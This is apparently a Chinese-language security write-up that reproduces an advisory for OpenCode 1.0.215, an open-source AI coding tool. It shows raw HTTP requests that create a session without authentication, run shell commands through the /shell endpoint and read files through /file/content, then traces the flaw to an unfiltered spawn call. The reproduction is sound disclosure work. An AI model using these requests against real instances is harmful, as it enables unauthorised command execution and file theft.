最近火爆天的OpenCode，就是那个开源的Claude Code替代

最近爆出来一个新的CVE

https://github.com/anomalyco/opencode/security/advisories/GHSA-vxw4-wv6m-9hhh

## 漏洞复现

我们这里采用1.0.215进行复现

```TypeScript
#初始化项目
npm init -y

#安装漏洞版本
npm i opencode-ai@1.0.215

#启动服务
node_modules/.bin
```

opencode的UI就是好看

![img](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=YThiYmU4NDc1NzU3MTI4YWE2YWJjMDM1ZjZkYThlM2ZfZVBiOEQ0Uk9RSU5yNlBycmFlRzgzellnN0tCQXdyREhfVG9rZW46TzNkMGI2SU1Lb1NqdXd4QjFIRWNkQVp6bnZ4XzE3Njg1ODI0MTk6MTc2ODU4NjAxOV9WNA)

### RCE

测试，先获取会话ID这里是无鉴权的

```TypeScript
bx336  ~  ♥ 00:07  curl -s -X POST http://127.0.0.1:4096/session -H "Content-Type: application/json" -d "{}"
{"id":"ses_4386ff31fffeP7CTCc2oDn2mwu","version":"1.0.215","projectID":"global","directory":"C:\\Users\\bx336\\Documents\\skills\\cve","title":"New session - 2026-01-16T16:07:45.120Z","time":{"created":1768579665120,"updated":1768579665120}}


bx336  ~  ♥ 00:07  curl -I -X OPTIONS http://127.0.0.1:4096/session
HTTP/1.1 204 No Content
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET,HEAD,PUT,POST,DELETE,PATCH
Date: Fri, 16 Jan 2026 16:08:30 GMT
Content-Length: 0
```

执行命令

```Bash
POST /session/ses_4386ff31fffeP7CTCc2oDn2mwu/shell HTTP/1.1
Host: 127.0.0.1:4096
User-Agent: curl/7.88.1
Accept: */*
Content-Type: application/json
Content-Length: 35
Connection: close

{"agent":"build","command":"whoami"}
```

![img](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=ODM4NDkxZmU0M2EyMDQ3MDZmOTEzNmJlNmUzYmQzNjJfeVVxTXpiSnlKNTc1SEd2T0I3T3VjTTJhSjJwTzRwN0hfVG9rZW46VHZuRWJvQ0Rxb1dBVll4N1FRYWMzZVRHblN2XzE3Njg1ODI0MjA6MTc2ODU4NjAyMF9WNA)

```TypeScript
#列目录
{"agent":"build","command":"ls"}
```

![img](https://hnusec-team.feishu.cn/space/api/box/stream/download/asynccode/?code=MmEwNDA2ZjBkMDBjOTdhMTc0ZTdlZWZlNDMwYjY4NTVfdTFkdXNkbFhNN0Z4YzNuMDllMEUzWGFXVmF4T0tnb0NfVG9rZW46TXRqUmJib0Q3b3J5RG14MERvOWM3aVZ0bnNjXzE3Njg1ODI0MjA6MTc2ODU4NjAyMF9WNA)

### 任意文件读取

任意文件读取

```TypeScript
GET /file/content?path=package.json HTTP/1.1
Host: 127.0.0.1:4096
User-Agent: curl/7.88.1
Accept: */*
Connection: close


HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Content-Type: application/json
Date: Fri, 16 Jan 2026 16:21:53 GMT
Content-Length: 95

{"type":"text","content":"{\n  \"dependencies\": {\n    \"opencode-ai\": \"^1.0.215\"\n  }\n}"}
```

## 具体代码分析

纵观代码就是没对输入进行限制和处理

RCE 源码分析（关键链路与代码细节）

| 环节     | 位置                                                         | 说明                                                 |
| -------- | ------------------------------------------------------------ | ---------------------------------------------------- |
| 路由入口 | `opencode-1.0.215\opencode-1.0.215\packages\opencode\src\server\server.ts:1407` | `/session/:sessionID/shell` 仅参数校验，无鉴权中间件 |
| 调用链   | `opencode-1.0.215\opencode-1.0.215\packages\opencode\src\server\server.ts:1434` | 直接调用 `SessionPrompt.shell`                       |
| 命令执行 | `opencode-1.0.215\opencode-1.0.215\packages\opencode\src\session\prompt.ts:1046` | `ShellInput.command` 为 `string`                     |
| 进程启动 | `opencode-1.0.215\opencode-1.0.215\packages\opencode\src\session\prompt.ts:1181` | `spawn(shell, args, ...)` 执行命令                   |

### 路由入口（未鉴权）

获取到json中的数据

```TypeScript
# opencode-1.0.215\opencode-1.0.215\packages\opencode\src\server\server.ts:1407

.post(
  "/session/:sessionID/shell",
  describeRoute({ summary: "Run shell command" }),
  validator("param", z.object({ sessionID: z.string() })),
  validator("json", SessionPrompt.ShellInput.omit({ sessionID: true })),
  async (c) => {
    const sessionID = c.req.valid("param").sessionID
    const body = c.req.valid("json")
    const msg = await SessionPrompt.shell({ ...body, sessionID })
    return c.json(msg)
  },
)
```

### 命令输入与执行

可以看一下这里使用 `zod` 库定义了 `ShellInput` 的结构

```TypeScript
# opencode-1.0.215\opencode-1.0.215\packages\opencode\src\session\prompt.ts:1046
export const ShellInput = z.object({
  sessionID: Identifier.schema("session"),
  agent: z.string(),
  model: z.object({ providerID: z.string(), modelID: z.string() }).optional(),
  command: z.string(),
})
```

`command: z.string()` 仅仅保证了输入是一个字符串，但并没有对字符串内容进行任何过滤

再回到执行部分，代码使用了 Node.js 的 `child_process.spawn` 来启动进程

```ts
# opencode-1.0.215\opencode-1.0.215\packages\opencode\src\session\prompt.ts:1181
const matchingInvocation = invocations[shellName] ?? invocations[""]
const args = matchingInvocation?.args

const proc = spawn(shell, args, {
  cwd: Instance.directory,
  detached: process.platform !== "win32",
  stdio: ["ignore", "pipe", "pipe"],
  env: { ...process.env, TERM: "dumb" },
})
```

命令在 `Instance.directory` 下运行



